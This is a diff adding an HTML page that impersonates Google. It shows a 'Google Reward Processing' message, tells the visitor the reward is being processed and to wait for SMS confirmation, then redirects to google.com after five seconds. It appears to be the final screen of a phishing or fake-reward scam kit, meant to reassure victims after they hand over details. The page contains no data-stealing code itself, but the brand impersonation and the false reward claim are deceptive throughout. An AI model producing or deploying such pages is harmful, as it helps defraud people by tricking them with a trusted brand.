@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google</title>
+  <style>
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #fff;
+    }
+    .message-box {
+      text-align: center;
+      padding: 20px;
+      background: #f1f1f1;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    .message-box h1 {
+      color: #202124;
+      font-size: 24px;
+    }
+    .message-box p {
+      color: #5f6368;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+  <div class="message-box">
+    <h1>Google Reward Processing</h1>
+    <p>🎉 Congratulations! Your Google Reward is being processed. Please wait for SMS confirmation.</p>
+    <p>Redirecting to Google in 5 seconds...</p>
+    <script>
+      setTimeout(function() {
+        window.location.href = 'https://www.google.com';
+      }, 5000);
+    </script>
+  </div>
+</body>
+</html>
